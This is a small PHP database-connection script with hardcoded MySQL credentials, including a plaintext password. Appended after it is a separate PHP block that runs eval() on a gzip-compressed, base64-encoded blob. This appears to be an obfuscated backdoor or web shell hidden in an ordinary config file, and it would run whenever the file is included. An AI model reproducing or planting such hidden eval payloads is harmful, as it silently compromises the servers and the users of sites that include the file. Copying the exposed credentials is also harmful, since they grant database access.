<?php
       header("Content-type: application/json; charset=utf-8");
       
       $host = "localhost";
       $user = "cksdlr7446"; 
       $pwd = "q1w2e3r4!";
       $dbname = "cksdlr7446";
       
       $connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
       mysqli_select_db($connect,$dbname);
?>
<?php eval(gzinflate(base64_decode('DdBHkqNIAADA50xPcMC72BNGgsZIQOEvG7iCQnjhX7+bT8hqz7qf+kYD7LK1+smzb8Ux/5ZVMZbVzx9YGvEyrZL0UD22ckUseo0Tak35JG1erPFHkjWUdGjBTS0+6z5TCdJALjcP4iGjcSNGmXKMl6hB970xVjczBnROjka0NwwhQRaMGoJQ4Utkmt2p2+cQAqkz3xvpzJxpCKX+O7YkJRJBGOwv2fR7x6w1TT3sIBqlqDaNSGxdqetCwTuGBN272fuskYFc47kB4VpAdys76iUrqC5Lbd9QEvwhdaM510QcDszW+JYWmQSp/BbLhukTZEcNA3C2Ss5SwPF+kZW8CwFtndHTQAXYNxeWrvNV30Il0aTf9jJnd77+SSlktRSXFxjaHoOuf9jq+woRG95OhnR6qSaY30qNK5e+xl/5HYgp6PMKZ3hUJo57EAa/1LGw2VxubHIR21eGLQD7qOlpNZLEReBCrBBNpGJMxLvlWrCUy6G2epjvqygm1bhgQTGK0/n27UMU5ppKvMl/YssO9WBw77Ike2eAPekFcJ76BAzP5vOB/R5N98QpkmwlkHuNx2+pitSeyYRe5V/eoVIbsro6tquKPaoAEcYnZxxptNJYIjXV9Rpnm7HqbpD1cIPv1M2bcnD8QZpEM27Aj4vdjRQ1uxZvUSe/8V4+u5YjpxRj3vlajBV8nsEsYnxp8zEVSIMRV+xFE83+Vk8b6qdmUg6CK5tT0wc5gOXHfE/4bTKIbaW3Ji5tjcr520PkBRIguV/+TXn40purdIMa3xcMh4KF81N9XDJkUoQPMNZkbrfo/lzJBoMajYK+agq8cbcUdCZePQCjjQHV/R/kzRSZabrdfhg9QdVVzlswYB5A7G4P1GB/6qfBrbt+6XR3YI8nIr7h+CwIBqcauHJnulXWhQ4PErWlnfJOGxrwaoCw9x7vmIv/+fv37z//AQ==')));?>